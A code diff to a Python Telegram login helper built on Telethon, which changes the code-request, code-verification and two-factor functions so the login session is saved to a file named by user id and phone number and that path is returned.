@@ -29,7 +29,9 @@ async def send_otp_pyrogram(user_id, phone_number, api_id=None, api_hash=None):
 
     os.makedirs("sessions", exist_ok=True)
 
-    client = TelegramClient(StringSession(), int(api_id), api_hash)
+    session_name = os.path.join("sessions", f"{user_id}_{phone_number}")
+    session_path = session_name + ".session"
+    client = TelegramClient(session_name, int(api_id), api_hash)
     try:
         await client.connect()
         sent = await client.send_code_request(phone_number)
@@ -37,6 +39,7 @@ async def send_otp_pyrogram(user_id, phone_number, api_id=None, api_hash=None):
             "client": client,
             "phone_number": phone_number,
             "phone_code_hash": sent.phone_code_hash,
+            "session_path": session_path,
         }
         return {"success": True}
     except Exception as e:
@@ -69,6 +72,7 @@ async def verify_otp_pyrogram(user_id, otp):
             "username": me.username or "",
             "phone": me.phone or phone_number,
             "session_string": session_str,
+            "session_path": state.get("session_path"),
         }
     except SessionPasswordNeededError:
         return {"error": "2fa_required"}
@@ -105,6 +109,7 @@ async def check_2fa_password(user_id, password):
             "username": me.username or "",
             "phone": me.phone or state.get("phone_number", ""),
             "session_string": session_str,
+            "session_path": state.get("session_path"),
         }
     except Exception as e:
         error_str = str(e)
